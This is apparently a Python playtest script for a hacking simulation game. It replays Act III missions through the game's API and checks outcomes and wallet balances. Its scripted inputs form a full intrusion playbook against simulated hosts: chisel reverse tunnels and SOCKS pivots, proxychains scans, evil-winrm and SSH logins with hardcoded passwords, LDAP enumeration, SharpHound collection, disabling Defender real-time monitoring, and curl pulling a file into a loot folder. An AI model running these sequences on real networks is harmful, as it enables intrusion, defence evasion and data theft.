"""Douze missions Lenoir par API, depuis une carrière ayant réellement fini l'acte II."""
import asyncio
import json
import tempfile
from pathlib import Path
import httpx
from api import main as api
from engine.career import Career
from engine.act3 import CHAPTERS
from act2_validation import play as play_act2

SSH=[('relay','ssh maintenance@10.90.10.10'),('relay','AsterLecture2026!')]
SOCKS=[('server','chisel server --reverse --port 8000'),*SSH,('relay','chisel client http://10.10.14.2:8000 R:1080:socks')]
PATHS={
 'act3_decouverte':[('main','nmap -sV -p 22,80 10.90.10.10'),('main','nmap -Pn -sV -p 22,80 10.90.10.10')],
 'act3_prestataire':[('main','nmap -Pn -p 22 10.90.10.11'),('main','nmap -Pn -p 22 10.90.10.10'),*SSH,('relay','whoami'),('relay','cat /home/maintenance/passation.txt')],
 'act3_origine':[('main','nmap -Pn -p 80 10.90.40.20'),*SSH,('relay','cat /home/maintenance/reseau.txt'),('relay','ip route'),('relay','nmap -sV -p 80 10.90.40.20'),('relay','curl http://10.90.40.20/registre.txt')],
 'act3_chisel':[('server','chisel server --reverse --port 8000'),*SSH,('relay','chisel client http://10.10.14.2:8000 R:8081:10.90.40.20:80'),('read','curl http://127.0.0.1:8081/registre.txt')],
 'act3_proxychains':[('main','nmap -Pn -p 80 10.90.40.20'),*SOCKS,('scan','proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 80 10.90.40.20')],
 'act3_winrm':[*SOCKS,('main','proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 5985 10.90.40.21'),('win','proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.21 -u audit -p LectureLenoir2026!'),('win','whoami'),('win',r'Get-Content C:\Users\audit\perimetre.txt')],
}
LDAP_SCAN=('main','proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 389 10.90.30.10')
LDAP=('main', 'proxychains4 -f ~/routes/aster.conf ldapsearch -x -H ldap://10.90.30.10 -D audit@lenoir.lab -w LectureLenoir2026! -b DC=lenoir,DC=lab "(objectClass=*)"')
EVENTS=r'Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational"'
ADMIN='proxychains4 -f ~/routes/aster.conf evil-winrm -u ops.local -p ControleLocal2026! -i '

def double_pivot(backup=False):
    ip='10.90.10.12' if backup else '10.90.10.10'
    login=[('relay', 'ssh maintenance@'+ip), ('relay', 'AsterLecture2026!')]
    return [('server','chisel server --reverse --port 8000'), *login,
      ('relay','chisel client http://10.10.14.2:8000 R:1080:socks'),
      ('secondserver','ssh maintenance@'+ip), ('secondserver','AsterLecture2026!'),
      ('secondserver','chisel server --reverse --port 8001'),
      ('secondclient','ssh maintenance@'+ip), ('secondclient','AsterLecture2026!'),
      ('secondclient','nmap -Pn -p 22 10.90.40.22'), ('secondclient','ssh relais@10.90.40.22'),
      ('secondclient','PassageLecture2026!'), ('secondclient','cat /home/relais/recherche.txt'),
      ('secondclient','chisel client http://'+ip+':8001 R:1081:socks')]

PATHS.update({
 'act3_droits': [*SOCKS, LDAP_SCAN, LDAP, ('main','proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.23 -u audit -p LectureLenoir2026!')],
 'act3_defender': [*SOCKS, ('win','proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.21 -u audit -p LectureLenoir2026!'), ('win','Get-MpComputerStatus'), ('win',r'C:\Tools\sharphound.exe -c All'), ('win',EVENTS), LDAP_SCAN, LDAP],
 'act3_tamper': [*SOCKS, ('win',ADMIN+'10.90.40.21'), ('win','Get-MpComputerStatus'), ('win','Set-MpPreference -DisableRealtimeMonitoring $true'), ('win','Get-MpComputerStatus'), ('win',EVENTS), ('control',ADMIN+'10.90.40.23'), ('control','Get-MpComputerStatus'), ('control','Set-MpPreference -DisableRealtimeMonitoring $true'), ('control','Get-MpComputerStatus')],
 'act3_second_pivot': [*double_pivot(), ('main','proxychains4 -f ~/routes/recherche.conf nmap -sT -Pn -n -p 80 10.92.10.20'), ('main','proxychains4 -f ~/routes/recherche.conf curl http://10.92.10.20/bordereau.txt')],
 'act3_repli': [*SSH, ('relay','nmap -Pn -p 445 10.90.60.10'), ('relay','whoami'), *double_pivot(True), ('main','proxychains4 -f ~/routes/secours.conf curl http://10.92.10.20/bordereau.txt')],
 'act3_dossier': [*double_pivot(), ('main','proxychains4 -f ~/routes/recherche.conf curl http://10.92.10.20/lot-industriel.txt > ~/loot/lot-industriel.txt'), ('main','cat ~/loot/lot-industriel.txt')],
})
EXPECTED_FAILURES={
 ('act3_repli','whoami'),
 ('act3_droits',PATHS['act3_droits'][-1][1]),
 ('act3_defender',r'C:\Tools\sharphound.exe -c All'),
 ('act3_tamper','Set-MpPreference -DisableRealtimeMonitoring $true'),
}
CONSOLES={'server':'term-2','relay':'term-3','read':'term-4','scan':'term-5','win':'term-6','control':'term-7','secondserver':'term-8','secondclient':'term-9'}

def expected_ok(cid, console, line):
    return (cid,line) not in EXPECTED_FAILURES or (cid=='act3_tamper' and console=='control')



async def qualify(output):
    output.mkdir(parents=True,exist_ok=True)
    saved=api._CAREER,api._WORKSPACE,api.GAMES,api.CONNECTIONS
    records=[];resumes=0
    try:
        with tempfile.TemporaryDirectory(prefix='darknet-act3-') as folder:
            profile=Career(Path(folder)/'career.json')
            await play_act2(profile,sides=False)
            # Profil de revue isolé : aucun accès anticipé ni progression inventée.
            review=output/'act3-playtest';review.mkdir(exist_ok=True)
            (review/'career.json').write_text(json.dumps(profile.data,ensure_ascii=False,indent=2)+'\n')
            api._CAREER=profile;api._WORKSPACE=None;api.GAMES={};api.CONNECTIONS={}
            async with httpx.AsyncClient(transport=httpx.ASGITransport(app=api.app),base_url='http://test') as client:
                for cid,_ in CHAPTERS:
                    world=(await client.get('/api/social')).json()
                    assert any(o['id']==cid for o in world['offers']),(cid,world['offers'])
                    response=await client.post('/api/games',json={'contract':cid,'handle':'NightShift','rng_seed':0})
                    assert response.status_code==200,(cid,response.text)
                    gid=response.json()['id'];frames=[]
                    for index,(console,line) in enumerate(PATHS[cid]):
                        response=await client.post(f'/api/games/{gid}/terminal',json={'line':line,'console_id':CONSOLES.get(console,console)})
                        assert response.status_code==200 and response.json()['ok']==expected_ok(cid,console,line),(cid,line,response.text)
                        while api.GAMES[gid].loop.pending():api.GAMES[gid].loop.tick()
                        profile.checkpoint(api.GAMES[gid].state)
                        frames.append({'line':line,'console':console,'context':response.json()['context'], 'ok':response.json()['ok'], 'output':response.json().get('output', [])})
                        # Inclut la reprise d'un scan, d'un client Chisel et d'une session WinRM.
                        if index in {0,len(PATHS[cid])-1}:
                            slot=await client.post('/api/saves/write',json={'name':'Acte III - '+cid})
                            assert slot.status_code==200,slot.text
                            loaded=await client.post('/api/saves/load',json={'slot_id':slot.json()['id'],'confirm':True})
                            assert loaded.status_code==200,loaded.text
                            resumed=await client.post('/api/profile/resume',json={})
                            assert resumed.status_code==200,resumed.text
                            gid=resumed.json()['id'];resumes+=1
                    response=await client.post(f'/api/games/{gid}/chat',json={'channel':'telegrid','peer':'traverse','text':'constat'})
                    assert response.status_code==200,response.text
                    state=api.GAMES[gid].state
                    assert state.contract_outcome=='SUCCESS',(cid,state.tool_data.get('investigation'))
                    records.append({'contract':cid,'frames':frames,'state':api._with_transcripts(state)})
                    profile.settle(gid,state)
                assert all(cid in profile.data['completed'] for cid,_ in CHAPTERS)
                assert 'contract_id' not in profile.view()['journey']
                ledger=profile.data['wallet']['entries'];balance=0
                for entry in ledger:
                    balance+=entry['amount'];assert balance==entry['balance']
                assert balance==profile.data['money']
                lot=profile.data['social']['documents']['lenoir-lot']
                assert lot['content']==state.terminal_files['/home/operator/loot/lot-industriel.txt']
                import hashlib
                assert lot['sha256']==hashlib.sha256(lot['content'].encode()).hexdigest()
                assert 'tls-lenoir-demande' not in profile.data['social'].get('transmissions', {})
    finally:
        api._CAREER,api._WORKSPACE,api.GAMES,api.CONNECTIONS=saved
    result={'missions':len(records),'resumes':resumes,'records':records}
    (output/'act3-qualification.json').write_text(json.dumps(result,ensure_ascii=False,indent=2)+'\n')
    print(f'Acte III : {len(records)} missions par API depuis les actes I et II, {resumes} reprises, transports et session WinRM vérifiés.')
    return result


if __name__=='__main__':
    import sys
    asyncio.run(qualify(Path(sys.argv[1]) if len(sys.argv)>1 else Path('build/validation')))
